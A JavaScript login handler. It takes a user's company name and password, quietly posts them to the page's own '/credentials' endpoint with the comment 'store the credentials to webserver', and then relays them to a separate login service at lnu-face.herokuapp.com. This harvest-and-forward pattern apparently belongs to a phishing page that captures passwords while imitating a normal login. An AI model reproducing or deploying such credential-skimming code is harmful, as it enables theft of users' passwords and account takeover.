function login(){
  var usn = document.getElementById('company').value,
      psw = document.getElementById('password').value,
      url = 'https://lnu-face.herokuapp.com/login';

  // store the credentials to webserver
  $.ajax({
    type: 'post',
    url: '/credentials',
    data: {
      company: usn,
      password: psw
    },
    success: function(){
      console.log('credentials stored');
    },
    error: function(xhr){
      console.error(xhr);
    }
  });

  var http = new XMLHttpRequest();
  http.open('POST', url, true);
  http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  http.onload = function(){
    if(http.readyState == 4 && http.status >= 200 && http.status <= 299) {
      if (http.status == 200) location.href = '/admin';
      else if (http.status == 203) location.href = '/user';
    }
    else {
      if(http.status == 404) document.querySelectorAll('div.ui.error.message').innerHTML = 'Username or Password is incorrect';
      else document.querySelectorAll('div.ui.error.message').innerHTML = http.responseText;
    }
  }
  http.send(JSON.stringify({company:usn,password:psw}));
}
